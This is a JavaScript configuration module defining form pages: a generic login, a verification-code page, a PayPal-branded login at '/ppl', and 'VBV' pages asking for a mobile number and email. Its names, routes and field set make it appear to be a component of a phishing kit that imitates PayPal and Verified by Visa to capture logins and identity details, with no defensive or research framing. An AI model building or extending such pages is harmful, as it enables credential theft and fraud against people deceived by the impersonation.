const componentRegistry = {
  Login: {
    fields: {
      emailField: {
        label: 'Email or username',
        type: 'text',
        placeholder: 'Email or username'
      },
      passwordField: {
        label: 'Password',
        type: 'password',
        placeholder: 'Password'
      }
    },
    route: '/login'
  },
  Verification: {
    fields: {
      codeField: {
        label: 'Enter verification code',
        type: 'text',
        placeholder: 'Enter code'
      }
    },
    route: '/verif'
  },
  PayPalLogin: {
    fields: {
      emailField: {
        label: 'Email address',
        type: 'text',
        placeholder: 'Email address'
      },
      passwordField: {
        label: 'Password',
        type: 'password',
        placeholder: 'Enter password'
      }
    },
    route: '/ppl'
  },
  VbvNotif: {
    fields: {
      mobileField: {
        label: 'Mobile number',
        type: 'text',
        placeholder: 'Enter mobile number'
      },
      emailField: {
        label: 'Email address',
        type: 'text',
        placeholder: 'Enter email address'
      }
    },
    route: '/container'
  },
  Vbvnotif: {
    fields: {
      title: {
        label: 'Verification Required',
        type: 'text',
        placeholder: 'Enter title'
      },
      subtitle: {
        label: 'Please verify your identity',
        type: 'text',
        placeholder: 'Enter subtitle'
      }
      // Add more fields as needed
    }
  },
  Vbvsubmit: {
    fields: {
      submitButton: {
        label: 'Submit',
        type: 'text',
        placeholder: 'Enter button text'
      },
      // Add more fields as needed
    }
  }
  // Add more components as needed
};

export default componentRegistry;
